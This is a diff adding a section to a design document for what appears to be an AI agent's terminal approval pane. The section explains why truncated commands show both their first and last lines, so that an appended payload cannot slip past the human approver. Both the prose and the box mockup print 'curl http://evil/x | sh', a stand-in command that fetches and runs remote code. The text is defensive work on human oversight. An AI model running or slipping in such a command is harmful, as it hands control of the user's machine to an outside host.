@@ -386,6 +386,33 @@ window it is drawn in — so on a half-height tmux pane it reads
 window can show on the row beneath it, and the decision itself still on the screen to be taken. A
 pane may lose the text; it may not lose the reader's knowledge that there was text.
 
+**And what it keeps is the head *and* the tail.** A body past its budget spends one row on the
+marker and keeps the rest around it: the lines the block opens with, and — wherever the budget can
+seat all three — the block's **last** line, beneath the marker. The tail is where an appended
+payload lives, so a pane that kept only the head could be approved off `npm test` while the line it
+never showed was `curl http://evil/x | sh`. Below three body rows there is no head-and-tail to have:
+two rows keep the first line, which is the one that says what the block is, and one row is the
+marker alone. One argument's **value** is bounded the same way before the pane ever sees it — eight
+lines, head, marker, tail — so no single value can push a sibling's label off the surface the
+decision is read from, and a key the model wrote **twice** appears once, carrying the value the
+executor will actually receive and marked as the duplicate it is. On the stock eighty-by-twenty-four
+window a two-argument call whose command runs to twenty lines reads
+
+```
+╭───────────────────────────── Approve terminal? ──────────────────────────────╮
+│ Reason: subprocess execution                                                 │
+│ workdir:                                                                     │
+│   /ws/a                                                                      │
+│ command:                                                                     │
+│ … (+7 more lines)                                                            │
+│   curl http://evil/x | sh                                                    │
+│                                                                              │
+│ ❯ Allow                      [a]                                             │
+╰──────────────────────────────────────────────────────────────────────────────╯
+```
+
+— both keys on the screen, and the line the decision actually turns on with them.
+
 **The rows are counted the same way, when there is no window for them at all.** A row window the
 pane did get scrolls around the selection, so the entries outside it are one keypress away and need
 no marker — and now that a row can wrap, a row is seated whole or not at all, so a window that
